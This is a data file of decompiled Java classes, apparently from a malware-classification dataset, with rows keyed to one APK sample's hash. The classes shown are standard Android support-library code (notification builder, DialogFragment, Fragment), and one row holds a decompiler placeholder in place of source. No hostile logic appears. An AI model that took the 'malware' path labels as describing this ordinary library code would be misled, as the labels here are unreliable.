this.mSubText=text;     return this;   }   public Builder setNumber(  int number){     this.mNumber=number;     return this;   }   public Builder setContentInfo(  CharSequence info){     this.mContentInfo=info;     return this;   }   public Builder setProgress(  int max,  int progress,  boolean indeterminate){     this.mProgressMax=max;     this.mProgress=progress;     this.mProgressIndeterminate=indeterminate;     return this;   }   public Builder setContent(  RemoteViews views){     this.mNotification.contentView=views;     return this;   }   public Builder setContentIntent(  PendingIntent intent){     this.mContentIntent=intent;     return this;   }   public Builder setDeleteIntent(  PendingIntent intent){     this.mNotification.deleteIntent=intent;     return this;   }   public Builder setFullScreenIntent(  PendingIntent intent,  boolean highPriority){     this.mFullScreenIntent=intent;     setFlag(128,highPriority);     return this;   }   public Builder setTicker(  CharSequence tickerText){     this.mNotification.tickerText=tickerText;     return this;   }   public Builder setTicker(  CharSequence tickerText,  RemoteViews views){     this.mNotification.tickerText=tickerText;     this.mTickerView=views;     return this;   }   public Builder setLargeIcon(  Bitmap icon){     this.mLargeIcon=icon;     return this;   }   public Builder setSound(  Uri sound){     this.mNotification.sound=sound;     this.mNotification.audioStreamType=-1;     return this;   }   public Builder setSound(  Uri sound,  int streamType){     this.mNotification.sound=sound;     this.mNotification.audioStreamType=streamType;     return this;   }   public Builder setVibrate(  long[] pattern){     this.mNotification.vibrate=pattern;     return this;   }   public Builder setLights(  int argb,  int onMs,  int offMs){     this.mNotification.ledARGB=argb;     this.mNotification.ledOnMS=onMs;     this.mNotification.ledOffMS=offMs;     boolean showLights=(this.mNotification.ledOnMS == 0 || this.mNotification.ledOffMS == 0) ? false : true;     this.mNotification.flags=(showLights ? 1 : 0) | (this.mNotification.flags & (-2));     return this;   }   public Builder setOngoing(  boolean ongoing){     setFlag(2,ongoing);     return this;   }   public Builder setOnlyAlertOnce(  boolean onlyAlertOnce){     setFlag(8,onlyAlertOnce);     return this;   }   public Builder setAutoCancel(  boolean autoCancel){     setFlag(16,autoCancel);     return this;   }   public Builder setDefaults(  int defaults){     this.mNotification.defaults=defaults;     if ((defaults & 4) != 0) {       this.mNotification.flags|=1;     }     return this;   }   private void setFlag(  int mask,  boolean value){     if (value) {       this.mNotification.flags|=mask;     }  else {       this.mNotification.flags&=mask ^ (-1);     }   }   public Builder setPriority(  int pri){     this.mPriority=pri;     return this;   }   public Builder addAction(  int icon,  CharSequence title,  PendingIntent intent){     this.mActions.add(new Action(icon,title,intent));     return this;   }   public Builder setStyle(  Style style){     if (this.mStyle != style) {       this.mStyle=style;       if (this.mStyle != null) {         this.mStyle.setBuilder(this);       }     }     return this;   }   @Deprecated public Notification getNotification(){     return NotificationCompat.IMPL.build(this);   }   public Notification build(){     return NotificationCompat.IMPL.build(this);   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\Delegate.code","public interface Delegate {   Drawable getThemeUpIndicator();   void setActionBarDescription(  int i);   void setActionBarUpIndicator(  Drawable drawable,  int i); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\DelegateProvider.code","public interface DelegateProvider {   Delegate getDrawerToggleDelegate(); } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\DialogFragment.code","public class DialogFragment extends Fragment implements DialogInterface.OnCancelListener, DialogInterface.OnDismissListener {   private static final String SAVED_BACK_STACK_ID=""android:backStackId"";   private static final String SAVED_CANCELABLE=""android:cancelable"";   private static final String SAVED_DIALOG_STATE_TAG=""android:savedDialogState"";   private static final String SAVED_SHOWS_DIALOG=""android:showsDialog"";   private static final String SAVED_STYLE=""android:style"";   private static final String SAVED_THEME=""android:theme"";   public static final int STYLE_NORMAL=0;   public static final int STYLE_NO_FRAME=2;   public static final int STYLE_NO_INPUT=3;   public static final int STYLE_NO_TITLE=1;   Dialog mDialog;   boolean mDismissed;   boolean mShownByMe;   boolean mViewDestroyed;   int mStyle=0;   int mTheme=0;   boolean mCancelable=true;   boolean mShowsDialog=true;   int mBackStackId=-1;   public void setStyle(  int style,  int theme){     this.mStyle=style;     if (this.mStyle == 2 || this.mStyle == 3) {       this.mTheme=R.style.Theme.Panel;     }     if (theme != 0) {       this.mTheme=theme;     }   }   public void show(  FragmentManager manager,  String tag){     this.mDismissed=false;     this.mShownByMe=true;     FragmentTransaction ft=manager.beginTransaction();     ft.add(this,tag);     ft.commit();   }   public int show(  FragmentTransaction transaction,  String tag){     this.mDismissed=false;     this.mShownByMe=true;     transaction.add(this,tag);     this.mViewDestroyed=false;     this.mBackStackId=transaction.commit();     return this.mBackStackId;   }   public void dismiss(){     dismissInternal(false);   }   public void dismissAllowingStateLoss(){     dismissInternal(true);   }   void dismissInternal(  boolean allowStateLoss){     if (!this.mDismissed) {       this.mDismissed=true;       this.mShownByMe=false;       if (this.mDialog != null) {         this.mDialog.dismiss();         this.mDialog=null;       }       this.mViewDestroyed=true;       if (this.mBackStackId >= 0) {         getFragmentManager().popBackStack(this.mBackStackId,1);         this.mBackStackId=-1;         return;       }       FragmentTransaction ft=getFragmentManager().beginTransaction();       ft.remove(this);       if (allowStateLoss) {         ft.commitAllowingStateLoss();       }  else {         ft.commit();       }     }   }   public Dialog getDialog(){     return this.mDialog;   }   public int getTheme(){     return this.mTheme;   }   public void setCancelable(  boolean cancelable){     this.mCancelable=cancelable;     if (this.mDialog != null) {       this.mDialog.setCancelable(cancelable);     }   }   public boolean isCancelable(){     return this.mCancelable;   }   public void setShowsDialog(  boolean showsDialog){     this.mShowsDialog=showsDialog;   }   public boolean getShowsDialog(){     return this.mShowsDialog;   }   @Override public void onAttach(  Activity activity){     super.onAttach(activity);     if (!this.mShownByMe) {       this.mDismissed=false;     }   }   @Override public void onDetach(){     super.onDetach();     if (!this.mShownByMe && !this.mDismissed) {       this.mDismissed=true;     }   }   @Override public void onCreate(  Bundle savedInstanceState){     super.onCreate(savedInstanceState);     this.mShowsDialog=this.mContainerId == 0;     if (savedInstanceState != null) {       this.mStyle=savedInstanceState.getInt(SAVED_STYLE,0);       this.mTheme=savedInstanceState.getInt(SAVED_THEME,0);       this.mCancelable=savedInstanceState.getBoolean(SAVED_CANCELABLE,true);       this.mShowsDialog=savedInstanceState.getBoolean(SAVED_SHOWS_DIALOG,this.mShowsDialog);       this.mBackStackId=savedInstanceState.getInt(SAVED_BACK_STACK_ID,-1);     }   }   @Override public LayoutInflater getLayoutInflater(  Bundle savedInstanceState){     if (!this.mShowsDialog) {       return super.getLayoutInflater(savedInstanceState);     }     this.mDialog=onCreateDialog(savedInstanceState); switch (this.mStyle) { case 3:       this.mDialog.getWindow().addFlags(24); case 1: case 2:     this.mDialog.requestWindowFeature(1);   break; } if (this.mDialog != null) { return (LayoutInflater)this.mDialog.getContext().getSystemService(""layout_inflater""); } return (LayoutInflater)this.mActivity.getSystemService(""layout_inflater""); } public Dialog onCreateDialog(Bundle savedInstanceState){ return new Dialog(getActivity(),getTheme()); } @Override public void onCancel(DialogInterface dialog){ } @Override public void onDismiss(DialogInterface dialog){ if (!this.mViewDestroyed) { dismissInternal(true); } } @Override public void onActivityCreated(Bundle savedInstanceState){ Bundle dialogState; super.onActivityCreated(savedInstanceState); if (this.mShowsDialog) { View view=getView(); if (view != null) {   if (view.getParent() != null) {     throw new IllegalStateException(""DialogFragment can not be attached to a container view"");   }   this.mDialog.setContentView(view); } this.mDialog.setOwnerActivity(getActivity()); this.mDialog.setCancelable(this.mCancelable); this.mDialog.setOnCancelListener(this); this.mDialog.setOnDismissListener(this); if (savedInstanceState != null && (dialogState=savedInstanceState.getBundle(SAVED_DIALOG_STATE_TAG)) != null) {   this.mDialog.onRestoreInstanceState(dialogState); } } } @Override public void onStart(){ super.onStart(); if (this.mDialog != null) { this.mViewDestroyed=false; this.mDialog.show(); } } @Override public void onSaveInstanceState(Bundle outState){ Bundle dialogState; super.onSaveInstanceState(outState); if (this.mDialog != null && (dialogState=this.mDialog.onSaveInstanceState()) != null) { outState.putBundle(SAVED_DIALOG_STATE_TAG,dialogState); } if (this.mStyle != 0) { outState.putInt(SAVED_STYLE,this.mStyle); } if (this.mTheme != 0) { outState.putInt(SAVED_THEME,this.mTheme); } if (!this.mCancelable) { outState.putBoolean(SAVED_CANCELABLE,this.mCancelable); } if (!this.mShowsDialog) { outState.putBoolean(SAVED_SHOWS_DIALOG,this.mShowsDialog); } if (this.mBackStackId != -1) { outState.putInt(SAVED_BACK_STACK_ID,this.mBackStackId); } } @Override public void onStop(){ super.onStop(); if (this.mDialog != null) { this.mDialog.hide(); } } @Override public void onDestroyView(){ super.onDestroyView(); if (this.mDialog != null) { this.mViewDestroyed=true; this.mDialog.dismiss(); this.mDialog=null; } } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\DummyTabFactory.code","static class DummyTabFactory implements TabHost.TabContentFactory {   private final Context mContext;   public DummyTabFactory(  Context context){     this.mContext=context;   }   @Override public View createTabContent(  String tag){     View v=new View(this.mContext);     v.setMinimumWidth(0);     v.setMinimumHeight(0);     return v;   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\Fragment.code","public class Fragment implements ComponentCallbacks, View.OnCreateContextMenuListener {   static final int ACTIVITY_CREATED=2;   static final int CREATED=1;   static final int INITIALIZING=0;   static final int RESUMED=5;   static final int STARTED=4;   static final int STOPPED=3;   private static final SimpleArrayMap<String,Class<?>> sClassMap=new SimpleArrayMap<>();   FragmentActivity mActivity;   boolean mAdded;   View mAnimatingAway;   Bundle mArguments;   int mBackStackNesting;   boolean mCalled;   boolean mCheckedForLoaderManager;   FragmentManagerImpl mChildFragmentManager;   ViewGroup mContainer;   int mContainerId;   boolean mDeferStart;   boolean mDetached;   int mFragmentId;   FragmentManagerImpl mFragmentManager;   boolean mFromLayout;   boolean mHasMenu;   boolean mHidden;   boolean mInLayout;   View mInnerView;   LoaderManagerImpl mLoaderManager;   boolean mLoadersStarted;   int mNextAnim;   Fragment mParentFragment;   boolean mRemoving;   boolean mRestored;   boolean mResumed;   boolean mRetainInstance;   boolean mRetaining;   Bundle mSavedFragmentState;   SparseArray<Parcelable> mSavedViewState;   int mStateAfterAnimating;   String mTag;   Fragment mTarget;   int mTargetRequestCode;   View mView;   String mWho;   int mState=0;   int mIndex=-1;   int mTargetIndex=-1;   boolean mMenuVisible=true;   boolean mUserVisibleHint=true; public static class SavedState implements Parcelable {     public static final Parcelable.Creator<SavedState> CREATOR=new Parcelable.Creator<SavedState>(){       @Override public SavedState createFromParcel(      Parcel in){         return new SavedState(in,null);       }       @Override public SavedState[] newArray(      int size){         return new SavedState[size];       }     } ;     final Bundle mState;     public SavedState(    Bundle state){       this.mState=state;     }     SavedState(    Parcel in,    ClassLoader loader){       this.mState=in.readBundle();       if (loader != null && this.mState != null) {         this.mState.setClassLoader(loader);       }     }     @Override public int describeContents(){       return 0;     }     @Override public void writeToParcel(    Parcel dest,    int flags){       dest.writeBundle(this.mState);     }   } public static class InstantiationException extends RuntimeException {     public InstantiationException(    String msg,    Exception cause){       super(msg,cause);     }   }   public static Fragment instantiate(  Context context,  String fname){     return instantiate(context,fname,null);   }   public static Fragment instantiate(  Context context,  String fname,  Bundle args){     try {       Class<?> clazz=sClassMap.get(fname);       if (clazz == null) {         clazz=context.getClassLoader().loadClass(fname);         sClassMap.put(fname,clazz);       }       Fragment f=(Fragment)clazz.newInstance();       if (args != null) {         args.setClassLoader(f.getClass().getClassLoader());         f.mArguments=args;       }       return f;     }  catch (    ClassNotFoundException e) {       throw new InstantiationException(""Unable to instantiate fragment "" + fname + "": make sure class name exists, is public, and has an empty constructor that is public"",e);     } catch (    IllegalAccessException e2) {       throw new InstantiationException(""Unable to instantiate fragment "" + fname + "": make sure class name exists, is public, and has an empty constructor that is public"",e2);     } catch (    java.lang.InstantiationException e3) {       throw new InstantiationException(""Unable to instantiate fragment "" + fname + "": make sure class name exists, is public, and has an empty constructor that is public"",e3);     }   }   public static boolean isSupportFragmentClass(  Context context,  String fname){     try {       Class<?> clazz=sClassMap.get(fname);       if (clazz == null) {         clazz=context.getClassLoader().loadClass(fname);         sClassMap.put(fname,clazz);       }       return Fragment.class.isAssignableFrom(clazz);     }  catch (    ClassNotFoundException e) {       return false;     }   }   public final void restoreViewState(  Bundle savedInstanceState){     if (this.mSavedViewState != null) {       this.mInnerView.restoreHierarchyState(this.mSavedViewState);       this.mSavedViewState=null;     }     this.mCalled=false;     onViewStateRestored(savedInstanceState);     if (!this.mCalled) {       throw new SuperNotCalledException(""Fragment "" + this + "" did not call through to super.onViewStateRestored()"");     }   }   public final void setIndex(  int index,  Fragment parent){     this.mIndex=index;     if (parent != null) {       this.mWho=parent.mWho + "":"" + this.mIndex;     }  else {       this.mWho=""android:fragment:"" + this.mIndex;     }   }   public final boolean isInBackStack(){     return this.mBackStackNesting > 0;   }   public final boolean equals(  Object o){     return super.equals(o);   }   public final int hashCode(){     return super.hashCode();   }   public String toString(){     StringBuilder sb=new StringBuilder(128);     DebugUtils.buildShortClassTag(this,sb);     if (this.mIndex >= 0) {       sb.append("" #"");       sb.append(this.mIndex);     }     if (this.mFragmentId != 0) {       sb.append("" id=0x"");       sb.append(Integer.toHexString(this.mFragmentId));     }     if (this.mTag != null) {       sb.append("" "");       sb.append(this.mTag);     }     sb.append('}');     return sb.toString();   }   public final int getId(){     return this.mFragmentId;   }   public final String getTag(){     return this.mTag;   }   public void setArguments(  Bundle args){     if (this.mIndex >= 0) {       throw new IllegalStateException(""Fragment already active"");     }     this.mArguments=args;   }   public final Bundle getArguments(){     return this.mArguments;   }   public void setInitialSavedState(  SavedState state){     if (this.mIndex >= 0) {       throw new IllegalStateException(""Fragment already active"");     }     this.mSavedFragmentState=(state == null || state.mState == null) ? null : state.mState;   }   public void setTargetFragment(  Fragment fragment,  int requestCode){     this.mTarget=fragment;     this.mTargetRequestCode=requestCode;   }   public final Fragment getTargetFragment(){     return this.mTarget;   }   public final int getTargetRequestCode(){     return this.mTargetRequestCode;   }   public final FragmentActivity getActivity(){     return this.mActivity;   }   public final Resources getResources(){     if (this.mActivity == null) {       throw new IllegalStateException(""Fragment "" + this + "" not attached to Activity"");     }     return this.mActivity.getResources();   }   public final CharSequence getText(  int resId){     return getResources().getText(resId);   }   public final String getString(  int resId){     return getResources().getString(resId);   }   public final String getString(  int resId,  Object... formatArgs){     return getResources().getString(resId,formatArgs);   }   public final FragmentManager getFragmentManager(){     return this.mFragmentManager;   }   public final FragmentManager getChildFragmentManager(){     if (this.mChildFragmentManager == null) {       instantiateChildFragmentManager();       if (this.mState >= 5) {         this.mChildFragmentManager.dispatchResume();       }  else       if (this.mState >= 4) {         this.mChildFragmentManager.dispatchStart();       }  else       if (this.mState >= 2) {         this.mChildFragmentManager.dispatchActivityCreated();       }  else       if (this.mState >= 1) {         this.mChildFragmentManager.dispatchCreate();       }     }     return this.mChildFragmentManager;   }   public final Fragment getParentFragment(){     return this.mParentFragment;   }   public final boolean isAdded(){     return this.mActivity != null && this.mAdded;   }   public final boolean isDetached(){     return this.mDetached;   }   public final boolean isRemoving(){     return this.mRemoving;   }   public final boolean isInLayout(){     return this.mInLayout;   }   public final boolean isResumed(){     return this.mResumed;   }   public final boolean isVisible(){     return (!isAdded() || isHidden() || this.mView == null || this.mView.getWindowToken() == null || this.mView.getVisibility() != 0) ? false : true;   }   public final boolean isHidden(){     return this.mHidden;   }   public final boolean hasOptionsMenu(){     return this.mHasMenu;   }   public final boolean isMenuVisible(){     return this.mMenuVisible;   }   public void onHiddenChanged(  boolean hidden){   }   public void setRetainInstance(  boolean retain){     if (retain && this.mParentFragment != null) {       throw new IllegalStateException(""Can't retain fragements that are nested in other fragments"");     }     this.mRetainInstance=retain;   }   public final boolean getRetainInstance(){     return this.mRetainInstance;   }   public void setHasOptionsMenu(  boolean hasMenu){     if (this.mHasMenu != hasMenu) {       this.mHasMenu=hasMenu;       if (isAdded() && !isHidden()) {         this.mActivity.supportInvalidateOptionsMenu();       }     }   }   public void setMenuVisibility(  boolean menuVisible){     if (this.mMenuVisible != menuVisible) {       this.mMenuVisible=menuVisible;       if (this.mHasMenu && isAdded() && !isHidden()) {         this.mActivity.supportInvalidateOptionsMenu();       }     }   }   public void setUserVisibleHint(  boolean isVisibleToUser){     if (!this.mUserVisibleHint && isVisibleToUser && this.mState < 4) {       this.mFragmentManager.performPendingDeferredStart(this);     }     this.mUserVisibleHint=isVisibleToUser;     this.mDeferStart=!isVisibleToUser;   }   public boolean getUserVisibleHint(){     return this.mUserVisibleHint;   }   public LoaderManager getLoaderManager(){     if (this.mLoaderManager != null) {       return this.mLoaderManager;     }     if (this.mActivity == null) {       throw new IllegalStateException(""Fragment "" + this + "" not attached to Activity"");     }     this.mCheckedForLoaderManager=true;     this.mLoaderManager=this.mActivity.getLoaderManager(this.mWho,this.mLoadersStarted,true);     return this.mLoaderManager;   }   public void startActivity(  Intent intent){     if (this.mActivity == null) {       throw new IllegalStateException(""Fragment "" + this + "" not attached to Activity"");     }     this.mActivity.startActivityFromFragment(this,intent,-1);   }   public void startActivityForResult(  Intent intent,  int requestCode){     if (this.mActivity == null) {       throw new IllegalStateException(""Fragment "" + this + "" not attached to Activity"");     }     this.mActivity.startActivityFromFragment(this,intent,requestCode);   }   public void onActivityResult(  int requestCode,  int resultCode,  Intent data){   }   public LayoutInflater getLayoutInflater(  Bundle savedInstanceState){     return this.mActivity.getLayoutInflater();   }   public void onInflate(  Activity activity,  AttributeSet attrs,  Bundle savedInstanceState){     this.mCalled=true;   }   public void onAttach(  Activity activity){     this.mCalled=true;   }   public Animation onCreateAnimation(  int transit,  boolean enter,  int nextAnim){     return null;   }   public void onCreate(  Bundle savedInstanceState){     this.mCalled=true;   }   public View onCreateView(  LayoutInflater inflater,  ViewGroup container,  Bundle savedInstanceState){     return null;   }   public void onViewCreated(  View view,  Bundle savedInstanceState){   }   public View getView(){     return this.mView;   }   public void onActivityCreated(  Bundle savedInstanceState){     this.mCalled=true;   }   public void onViewStateRestored(  Bundle savedInstanceState){     this.mCalled=true;   }   public void onStart(){     this.mCalled=true;     if (!this.mLoadersStarted) {       this.mLoadersStarted=true;       if (!this.mCheckedForLoaderManager) {         this.mCheckedForLoaderManager=true;         this.mLoaderManager=this.mActivity.getLoaderManager(this.mWho,this.mLoadersStarted,false);       }       if (this.mLoaderManager != null) {         this.mLoaderManager.doStart();       }     }   }   public void onResume(){     this.mCalled=true;   }   public void onSaveInstanceState(  Bundle outState){   }   @Override public void onConfigurationChanged(  Configuration newConfig){     this.mCalled=true;   }   public void onPause(){     this.mCalled=true;   }   public void onStop(){     this.mCalled=true;   }   @Override public void onLowMemory(){     this.mCalled=true;   }   public void onDestroyView(){     this.mCalled=true;   }   public void onDestroy(){     this.mCalled=true;     if (!this.mCheckedForLoaderManager) {       this.mCheckedForLoaderManager=true;       this.mLoaderManager=this.mActivity.getLoaderManager(this.mWho,this.mLoadersStarted,false);     }     if (this.mLoaderManager != null) {       this.mLoaderManager.doDestroy();     }   }   public void initState(){     this.mIndex=-1;     this.mWho=null;     this.mAdded=false;     this.mRemoving=false;     this.mResumed=false;     this.mFromLayout=false;     this.mInLayout=false;     this.mRestored=false;     this.mBackStackNesting=0;     this.mFragmentManager=null;     this.mActivity=null;     this.mFragmentId=0;     this.mContainerId=0;     this.mTag=null;     this.mHidden=false;     this.mDetached=false;     this.mRetaining=false;     this.mLoaderManager=null;     this.mLoadersStarted=false;     this.mCheckedForLoaderManager=false;   }   public void onDetach(){     this.mCalled=true;   }   public void onCreateOptionsMenu(  Menu menu,  MenuInflater inflater){   }   public void onPrepareOptionsMenu(  Menu menu){   }   public void onDestroyOptionsMenu(){   }   public boolean onOptionsItemSelected(  MenuItem item){     return false;   }   public void onOptionsMenuClosed(  Menu menu){   }   @Override public void onCreateContextMenu(  ContextMenu menu,  View v,  ContextMenu.ContextMenuInfo menuInfo){     getActivity().onCreateContextMenu(menu,v,menuInfo);   }   public void registerForContextMenu(  View view){     view.setOnCreateContextMenuListener(this);   }   public void unregisterForContextMenu(  View view){     view.setOnCreateContextMenuListener(null);   }   public boolean onContextItemSelected(  MenuItem item){     return false;   }   public void dump(  String prefix,  FileDescriptor fd,  PrintWriter writer,  String[] args){     writer.print(prefix);     writer.print(""mFragmentId=#"");     writer.print(Integer.toHexString(this.mFragmentId));     writer.print("" mContainerId=#"");     writer.print(Integer.toHexString(this.mContainerId));     writer.print("" mTag="");     writer.println(this.mTag);     writer.print(prefix);     writer.print(""mState="");     writer.print(this.mState);     writer.print("" mIndex="");     writer.print(this.mIndex);     writer.print("" mWho="");     writer.print(this.mWho);     writer.print("" mBackStackNesting="");     writer.println(this.mBackStackNesting);     writer.print(prefix);     writer.print(""mAdded="");     writer.print(this.mAdded);     writer.print("" mRemoving="");     writer.print(this.mRemoving);     writer.print("" mResumed="");     writer.print(this.mResumed);     writer.print("" mFromLayout="");     writer.print(this.mFromLayout);     writer.print("" mInLayout="");     writer.println(this.mInLayout);     writer.print(prefix);     writer.print(""mHidden="");     writer.print(this.mHidden);     writer.print("" mDetached="");     writer.print(this.mDetached);     writer.print("" mMenuVisible="");     writer.print(this.mMenuVisible);     writer.print("" mHasMenu="");     writer.println(this.mHasMenu);     writer.print(prefix);     writer.print(""mRetainInstance="");     writer.print(this.mRetainInstance);     writer.print("" mRetaining="");     writer.print(this.mRetaining);     writer.print("" mUserVisibleHint="");     writer.println(this.mUserVisibleHint);     if (this.mFragmentManager != null) {       writer.print(prefix);       writer.print(""mFragmentManager="");       writer.println(this.mFragmentManager);     }     if (this.mActivity != null) {       writer.print(prefix);       writer.print(""mActivity="");       writer.println(this.mActivity);     }     if (this.mParentFragment != null) {       writer.print(prefix);       writer.print(""mParentFragment="");       writer.println(this.mParentFragment);     }     if (this.mArguments != null) {       writer.print(prefix);       writer.print(""mArguments="");       writer.println(this.mArguments);     }     if (this.mSavedFragmentState != null) {       writer.print(prefix);       writer.print(""mSavedFragmentState="");       writer.println(this.mSavedFragmentState);     }     if (this.mSavedViewState != null) {       writer.print(prefix);       writer.print(""mSavedViewState="");       writer.println(this.mSavedViewState);     }     if (this.mTarget != null) {       writer.print(prefix);       writer.print(""mTarget="");       writer.print(this.mTarget);       writer.print("" mTargetRequestCode="");       writer.println(this.mTargetRequestCode);     }     if (this.mNextAnim != 0) {       writer.print(prefix);       writer.print(""mNextAnim="");       writer.println(this.mNextAnim);     }     if (this.mContainer != null) {       writer.print(prefix);       writer.print(""mContainer="");       writer.println(this.mContainer);     }     if (this.mView != null) {       writer.print(prefix);       writer.print(""mView="");       writer.println(this.mView);     }     if (this.mInnerView != null) {       writer.print(prefix);       writer.print(""mInnerView="");       writer.println(this.mView);     }     if (this.mAnimatingAway != null) {       writer.print(prefix);       writer.print(""mAnimatingAway="");       writer.println(this.mAnimatingAway);       writer.print(prefix);       writer.print(""mStateAfterAnimating="");       writer.println(this.mStateAfterAnimating);     }     if (this.mLoaderManager != null) {       writer.print(prefix);       writer.println(""Loader Manager:"");       this.mLoaderManager.dump(prefix + ""  "",fd,writer,args);     }     if (this.mChildFragmentManager != null) {       writer.print(prefix);       writer.println(""Child "" + this.mChildFragmentManager + "":"");       this.mChildFragmentManager.dump(prefix + ""  "",fd,writer,args);     }   }   public Fragment findFragmentByWho(  String who){     if (!who.equals(this.mWho)) {       if (this.mChildFragmentManager != null) {         return this.mChildFragmentManager.findFragmentByWho(who);       }       return null;     }     return this;   }   void instantiateChildFragmentManager(){     this.mChildFragmentManager=new FragmentManagerImpl();     this.mChildFragmentManager.attachActivity(this.mActivity,new FragmentContainer(){       @Override public View findViewById(      int id){         if (Fragment.this.mView == null) {           throw new IllegalStateException(""Fragment does not have a view"");         }         return Fragment.this.mView.findViewById(id);       }     } ,this);   }   public void performCreate(  Bundle savedInstanceState){     Parcelable p;     if (this.mChildFragmentManager != null) {       this.mChildFragmentManager.noteStateNotSaved();     }     this.mCalled=false;     onCreate(savedInstanceState);     if (!this.mCalled) {       throw new SuperNotCalledException(""Fragment "" + this + "" did not call through to super.onCreate()"");     }     if (savedInstanceState != null && (p=savedInstanceState.getParcelable(""android:support:fragments"")) != null) {       if (this.mChildFragmentManager == null) {         instantiateChildFragmentManager();       }       this.mChildFragmentManager.restoreAllState(p,null);       this.mChildFragmentManager.dispatchCreate();     }   }   public View performCreateView(  LayoutInflater inflater,  ViewGroup container,  Bundle savedInstanceState){     if (this.mChildFragmentManager != null) {       this.mChildFragmentManager.noteStateNotSaved();     }     return onCreateView(inflater,container,savedInstanceState);   }   public void performActivityCreated(  Bundle savedInstanceState){     if (this.mChildFragmentManager != null) {       this.mChildFragmentManager.noteStateNotSaved();     }     this.mCalled=false;     onActivityCreated(savedInstanceState);     if (!this.mCalled) {       throw new SuperNotCalledException(""Fragment "" + this + "" did not call through to super.onActivityCreated()"");     }     if (this.mChildFragmentManager != null) {       this.mChildFragmentManager.dispatchActivityCreated();     }   }   public void performStart(){     if (this.mChildFragmentManager != null) {       this.mChildFragmentManager.noteStateNotSaved();       this.mChildFragmentManager.execPendingActions();     }     this.mCalled=false;     onStart();     if (!this.mCalled) {       throw new SuperNotCalledException(""Fragment "" + this + "" did not call through to super.onStart()"");     }     if (this.mChildFragmentManager != null) {       this.mChildFragmentManager.dispatchStart();     }     if (this.mLoaderManager != null) {       this.mLoaderManager.doReportStart();     }   }   public void performResume(){     if (this.mChildFragmentManager != null) {       this.mChildFragmentManager.noteStateNotSaved();       this.mChildFragmentManager.execPendingActions();     }     this.mCalled=false;     onResume();     if (!this.mCalled) {       throw new SuperNotCalledException(""Fragment "" + this + "" did not call through to super.onResume()"");     }     if (this.mChildFragmentManager != null) {       this.mChildFragmentManager.dispatchResume();       this.mChildFragmentManager.execPendingActions();     }   }   public void performConfigurationChanged(  Configuration newConfig){     onConfigurationChanged(newConfig);     if (this.mChildFragmentManager != null) {       this.mChildFragmentManager.dispatchConfigurationChanged(newConfig);     }   }   public void performLowMemory(){     onLowMemory();     if (this.mChildFragmentManager != null) {       this.mChildFragmentManager.dispatchLowMemory();     }   }   public boolean performCreateOptionsMenu(  Menu menu,  MenuInflater inflater){     boolean show=false;     if (this.mHidden) {       return false;     }     if (this.mHasMenu && this.mMenuVisible) {       show=true;       onCreateOptionsMenu(menu,inflater);     }     if (this.mChildFragmentManager != null) {       return show | this.mChildFragmentManager.dispatchCreateOptionsMenu(menu,inflater);     }     return show;   }   public boolean performPrepareOptionsMenu(  Menu menu){     boolean show=false;     if (this.mHidden) {       return false;     }     if (this.mHasMenu && this.mMenuVisible) {       show=true;       onPrepareOptionsMenu(menu);     }     if (this.mChildFragmentManager != null) {       return show | this.mChildFragmentManager.dispatchPrepareOptionsMenu(menu);     }     return show;   }   public boolean performOptionsItemSelected(  MenuItem item){     if (!this.mHidden) {       if (this.mHasMenu && this.mMenuVisible && onOptionsItemSelected(item)) {         return true;       }       if (this.mChildFragmentManager != null && this.mChildFragmentManager.dispatchOptionsItemSelected(item)) {         return true;       }     }     return false;   }   public boolean performContextItemSelected(  MenuItem item){     if (!this.mHidden) {       if (onContextItemSelected(item)) {         return true;       }       if (this.mChildFragmentManager != null && this.mChildFragmentManager.dispatchContextItemSelected(item)) {         return true;       }     }     return false;   }   public void performOptionsMenuClosed(  Menu menu){     if (!this.mHidden) {       if (this.mHasMenu && this.mMenuVisible) {         onOptionsMenuClosed(menu);       }       if (this.mChildFragmentManager != null) {         this.mChildFragmentManager.dispatchOptionsMenuClosed(menu);       }     }   }   public void performSaveInstanceState(  Bundle outState){     Parcelable p;     onSaveInstanceState(outState);     if (this.mChildFragmentManager != null && (p=this.mChildFragmentManager.saveAllState()) != null) {       outState.putParcelable(""android:support:fragments"",p);     }   }   public void performPause(){     if (this.mChildFragmentManager != null) {       this.mChildFragmentManager.dispatchPause();     }     this.mCalled=false;     onPause();     if (!this.mCalled) {       throw new SuperNotCalledException(""Fragment "" + this + "" did not call through to super.onPause()"");     }   }   public void performStop(){     if (this.mChildFragmentManager != null) {       this.mChildFragmentManager.dispatchStop();     }     this.mCalled=false;     onStop();     if (!this.mCalled) {       throw new SuperNotCalledException(""Fragment "" + this + "" did not call through to super.onStop()"");     }   }   public void performReallyStop(){     if (this.mChildFragmentManager != null) {       this.mChildFragmentManager.dispatchReallyStop();     }     if (this.mLoadersStarted) {       this.mLoadersStarted=false;       if (!this.mCheckedForLoaderManager) {         this.mCheckedForLoaderManager=true;         this.mLoaderManager=this.mActivity.getLoaderManager(this.mWho,this.mLoadersStarted,false);       }       if (this.mLoaderManager != null) {         if (!this.mActivity.mRetaining) {           this.mLoaderManager.doStop();         }  else {           this.mLoaderManager.doRetain();         }       }     }   }   public void performDestroyView(){     if (this.mChildFragmentManager != null) {       this.mChildFragmentManager.dispatchDestroyView();     }     this.mCalled=false;     onDestroyView();     if (!this.mCalled) {       throw new SuperNotCalledException(""Fragment "" + this + "" did not call through to super.onDestroyView()"");     }     if (this.mLoaderManager != null) {       this.mLoaderManager.doReportNextStart();     }   }   public void performDestroy(){     if (this.mChildFragmentManager != null) {       this.mChildFragmentManager.dispatchDestroy();     }     this.mCalled=false;     onDestroy();     if (!this.mCalled) {       throw new SuperNotCalledException(""Fragment "" + this + "" did not call through to super.onDestroy()"");     }   } } "
"msc_data/decompiled_malware_class/001EF856699CBB1791EF2DEB00F66DD259491C332E0A8A4DC3ADF80531EBFF8B\android.support.v4.app\FragmentActivity.code","!org.eclipse.jdt.core.dom.TypeDeclaration@78c23ade"
